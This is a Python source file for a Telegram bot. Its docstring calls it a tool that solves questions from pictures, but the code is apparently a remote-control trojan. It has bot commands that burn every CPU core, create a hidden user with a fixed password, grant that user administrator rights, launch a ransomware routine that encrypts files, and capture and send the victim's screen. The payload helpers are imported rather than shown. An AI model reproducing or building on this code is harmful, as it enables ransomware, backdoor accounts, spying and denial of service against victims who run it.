



'''
References:
        https://docs.aiogram.dev/en/latest/quick_start.html
		https://github.com/wildonion/stomegranate
		
		
Features:
		- Build A Telegram Bot To Solve An Specific Question From Its Picture And Send Us The Answer In A picture
'''

from Crypto.Cipher import XOR
import ctypes
import win32api
import base64
import random
import sys
import os
import logging
import multiprocessing
from utils import net, hw, cry
import pyscreenshot as ImageGrab
from aiogram import Bot, Dispatcher, executor, types



API_TOKEN = ''
logging.basicConfig(level=logging.INFO)
bot = Bot(token=API_TOKEN)
dp = Dispatcher(bot)



@dp.message_handler(commands=['burn_cpu'])
async def burn(message: types.message):
	process_count = 1
	while(process_count <= multiprocessing.cpu_count()):
		process_to_be_not_seen_again = multiprocessing.Process(target=hw.CPU.burn())
		process_to_be_not_seen_again.start()
		process_count += 1
	await message.reply("Burning CPU...")


@dp.message_handler(commands=["add_user"])
async def make_admin(message: types.message):
	net.User.add()
	await message.reply("added new user with info >>> [name] : ielts, [password] : @1234*")


@dp.message_handler(commands=["make_admin"])
async def make_admin(message: types.message):
	net.User.admin()
	await message.reply("user ielts is now admin")


@dp.message_handler(commands=["ransome"])
async def ransome(message: types.message):
	cry.Ransome.run()
	await message.reply("encrypting everything...")


@dp.message_handler(commands=['sc'])
async def sc(message: types.Message):
	im = ImageGrab.grab()
	im.save('sc.png')
	with open('sc.png', 'rb') as photo:
		await message.reply_photo(photo, caption='fullsc')
	os.remove("sc.png")


if __name__ == '__main__':
	executor.start_polling(dp, skip_updates=True)
